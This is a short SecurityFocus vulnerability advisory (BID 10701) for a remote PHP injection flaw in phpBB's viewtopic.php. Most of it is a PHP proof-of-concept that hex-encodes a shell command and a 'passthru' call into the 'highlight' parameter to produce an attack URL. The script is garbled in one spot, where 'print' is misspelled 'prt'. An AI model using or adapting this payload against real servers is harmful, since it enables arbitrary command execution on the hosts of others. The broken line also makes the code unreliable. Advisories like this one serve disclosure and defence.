source: http://www.securityfocus.com/bid/10701/info

The 'viewtopic.php' phpBB script is prone to a remote PHP script injection vulnerability because the application fails to properly sanitize user-supplied URI parameters before using them to construct dynamically generated web pages.

Exploiting this issue may allow a remote attacker to execute arbitrary commands in the context of the webserver that is hosting the vulnerable software. 

<?
$rush='ls -al'; //do what
$highlight='passthru($HTTP_GET_VARS[rush])'; // dont touch

print "?t=%37&rush=";

for ($i=0; $i<strlen($rush); ++$i) {
 print '%' . bin2hex(substr($rush,$i,1));
}

print "&highlight=%2527.";

for ($i=0; $i<strlen($highlight); ++$i) {
 prt '%' . bin2hex(substr($highlight,$i,1));
}

print ".%2527";
?>